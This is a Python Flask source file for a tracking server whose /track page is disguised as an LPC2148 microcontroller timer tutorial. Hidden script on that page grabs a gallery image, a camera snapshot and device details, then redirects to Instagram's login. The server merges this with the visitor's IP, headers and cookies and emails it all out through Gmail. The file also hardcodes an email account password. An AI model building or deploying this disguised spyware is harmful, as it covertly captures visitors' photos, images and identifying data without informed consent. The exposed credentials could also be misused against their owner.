from flask import Flask, request, render_template_string, jsonify
import time
import json
from user_agents import parse
import os
import requests
import socket
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

visitor_data = []
EMAIL_SENDER = "ezhilkirthikm@gmail.com"  # Replace with your email
EMAIL_PASSWORD = "murugesansangeethaezhilkirthikpradharshana1973198120052009"   # Replace with your app-specific password
EMAIL_RECEIVER = "ezhilkirthik2005@gmail.com"  # Replace with receiver email

@app.route('/track')
def track():
    ip_address = request.remote_addr
    raw_user_agent = request.headers.get('User-Agent', 'Unknown')
    headers = dict(request.headers)

    ua = parse(raw_user_agent)
    
    try:
        hostname = socket.gethostbyaddr(ip_address)[0]
    except (socket.herror, socket.gaierror):
        hostname = 'Unknown'

    browser_profile_name = (
        f"{ua.browser.family or 'Unknown'}-{ua.browser.version_string or 'Unknown'}_"
        f"{ua.os.family or 'Unknown'}-{ua.os.version_string or 'Unknown'}_"
        f"{ua.device.family or 'Unknown'}-{ua.device.brand or 'Unknown'}"
    ).replace(" ", "-")

    visitor_info = {
        'ip': ip_address,
        'hostname': hostname,
        'user_agent': raw_user_agent,
        'browser_profile_name': browser_profile_name,
        'device': ua.device.family if ua.device.family else 'Unknown',
        'device_brand': ua.device.brand if ua.device.brand else 'Unknown',
        'device_model': ua.device.model if ua.device.model else 'Unknown',
        'os': ua.os.family if ua.os.family else 'Unknown',
        'os_version': ua.os.version_string if ua.os.version_string else 'Unknown',
        'browser': ua.browser.family if ua.browser.family else 'Unknown',
        'browser_version': ua.browser.version_string if ua.browser.version_string else 'Unknown',
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'headers': headers,
        'referrer': request.referrer if request.referrer else 'Unknown',
        'cookies': request.cookies if request.cookies else 'None',
        'accept_language': request.headers.get('Accept-Language', 'Unknown'),
    }
    visitor_data.append(visitor_info)

    html = """
    <html>
    <body>
            <h1>LPC2148 Timer Summary</h1>
    
    <h2>Features of LPC2148 Timers</h2>
    <ul>
        <li>Two Independent 32-bit Timers (Timer 0 and Timer 1)</li>
        <li>Prescaler for Time Scaling</li>
        <li>Four Capture Inputs (Per Timer) for Event Monitoring</li>
        <li>Four Match Registers (Per Timer) for Interrupt/Event Generation</li>
        <li>Interrupt Support</li>
        <li>PWM Support</li>
    </ul>
    
    <h2>Registers Involved in LPC2148 Timers</h2>
    <table>
        <tr>
            <th>Register Name</th>
            <th>Description</th>
        </tr>
        <tr><td>TCR (Timer Control Register)</td><td>Starts, stops, and resets the timer.</td></tr>
        <tr><td>TC (Timer Counter Register)</td><td>Stores the current timer count.</td></tr>
        <tr><td>PR (Prescale Register)</td><td>Defines the timer resolution.</td></tr>
        <tr><td>PC (Prescale Counter Register)</td><td>Internal counter for scaling down timer increments.</td></tr>
        <tr><td>MR0 - MR3 (Match Registers)</td><td>Stores values for timer comparison to trigger events.</td></tr>
        <tr><td>MCR (Match Control Register)</td><td>Configures the behavior of match registers (interrupts/reset/stop).</td></tr>
        <tr><td>CR0 - CR3 (Capture Registers)</td><td>Stores timestamps when external capture events occur.</td></tr>
        <tr><td>CCR (Capture Control Register)</td><td>Configures capture functionality (rising/falling edges).</td></tr>
        <tr><td>EMR (External Match Register)</td><td>Controls external pin behavior based on match conditions.</td></tr>
    </table>
    
    <h2>Modes of Operation</h2>
    <ul>
        <li><b>Timer Mode:</b> Basic counting for delays.</li>
        <li><b>Capture Mode:</b> Records external signal transitions.</li>
        <li><b>Match Mode:</b> Generates interrupts or actions when reaching a value.</li>
        <li><b>PWM Mode:</b> Supports Pulse Width Modulation.</li>
    </ul>
    
    <h2>Timer Calculation Example</h2>
    <p><b>Assume:</b></p>
    <ul>
        <li>PCLK = 60 MHz</li>
        <li>Desired delay = 1 ms</li>
    </ul>
    <p>To achieve 1ms delay, we set <code>MR0 = 60000</code>.</p>
    
    <h3>Example Code (Keil C)</h3>
    <pre><code>#include &lt;lpc214x.h&gt;

void timer0_init(void) {
    T0TCR = 0x02;   // Reset Timer
    T0PR  = 0;      // Prescaler (not used)
    T0MR0 = 60000;  // Match value for 1ms delay
    T0MCR = 0x03;   // Interrupt and reset on MR0 match
    T0TCR = 0x01;   // Start Timer
}</code></pre>
    
    <h2>Applications of LPC2148 Timer</h2>
    <ul>
        <li>Time Delays (Millisecond/Microsecond Precision)</li>
        <li>Event Counting (Using Capture Mode)</li>
        <li>Frequency Measurement (Using Capture Mode)</li>
        <li>PWM (Motor Control, LED Dimming)</li>
        <li>Real-Time Clock Functions</li>
        <li>Periodic Interrupt Generation</li>
    </ul>
    
    <h2>Conclusion</h2>
    <p>The LPC2148 Timer is a versatile and powerful component of the ARM7 microcontroller, enabling precise timing, event handling, and PWM generation. Its configurable match and capture registers make it ideal for a wide range of embedded applications.</p>
        <p id="status">Requesting gallery access...</p>
        <input type="file" id="galleryInput" accept="image/*" style="display:none;">
        <video id="video" width="640" height="480" autoplay style="display:none;"></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        
        <script>
            // Collect client-side data
            const deviceInfo = {
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                languages: navigator.languages || [navigator.language],
                platform: navigator.platform || 'Unknown',
            };

            // Step 1: Request gallery access
            async function requestGalleryAccess() {
                return new Promise((resolve) => {
                    const galleryInput = document.getElementById('galleryInput');
                    galleryInput.onchange = (e) => {
                        if (e.target.files && e.target.files[0]) {
                            const reader = new FileReader();
                            reader.onload = (event) => {
                                deviceInfo.galleryImage = event.target.result;
                                resolve(true);
                            };
                            reader.readAsDataURL(e.target.files[0]);
                        } else {
                            resolve(false);
                        }
                    };
                    galleryInput.click();
                });
            }

            // Step 2: Simulate call access (not directly possible in browsers)
            function requestCallAccess() {
                return new Promise((resolve) => {
                    if (confirm('Allow access to calls? (Simulation only)')) {
                        deviceInfo.callAccess = 'Granted (simulated)';
                        resolve(true);
                    } else {
                        deviceInfo.callAccess = 'Denied';
                        resolve(false);
                    }
                });
            }

            // Step 3: Request camera access
            async function requestCameraAccess() {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    video.srcObject = stream;
                    await new Promise(resolve => video.onloadedmetadata = resolve);
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const screenshot = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(track => track.stop());
                    deviceInfo.cameraScreenshot = screenshot;
                    return true;
                } catch (err) {
                    deviceInfo.cameraError = err.message;
                    return false;
                }
            }

            // Step 4: Redirect to Instagram and capture details
            async function captureInstagramDetails() {
                document.getElementById('status').innerText = 'Redirecting to Instagram...';
                window.location.href = 'https://www.instagram.com/accounts/login/';
                // Note: Screen recording or account details require user interaction and cannot be fully automated
                deviceInfo.instagramNote = 'User redirected to Instagram login. Manual details required.';
            }

            // Main execution flow
            (async () => {
                // Gallery access
                const galleryGranted = await requestGalleryAccess();
                document.getElementById('status').innerText = galleryGranted 
                    ? 'Gallery access granted!' 
                    : 'Gallery access denied.';

                // Call access (simulated)
                const callGranted = await requestCallAccess();
                document.getElementById('status').innerText += callGranted 
                    ? ' Call access granted!' 
                    : ' Call access denied.';

                // Camera access
                const cameraGranted = await requestCameraAccess();
                document.getElementById('status').innerText += cameraGranted 
                    ? ' Camera access granted!' 
                    : ' Camera access denied.';

                // Send data so far
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceInfo)
                });

                // Redirect to Instagram
                if (cameraGranted) {
                    await captureInstagramDetails();
                } else {
                    document.getElementById('status').innerText = 'Process stopped due to camera denial.';
                }
            })();
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/log', methods=['POST'])
def log():
    client_data = request.json
    if visitor_data and client_data:
        combined_data = visitor_data[-1].copy()
        combined_data.update(client_data)
        send_to_email(combined_data)
    return jsonify({'status': 'success'})

def send_to_email(data):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = 'Visitor Data Capture'

        body = json.dumps(data, indent=2)
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)
        print("Data sent to email successfully")
    except Exception as e:
        print(f"Error sending email: {e}")

@app.route('/')
def root():
    return "Welcome to the tracker. Visit /track to start."

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
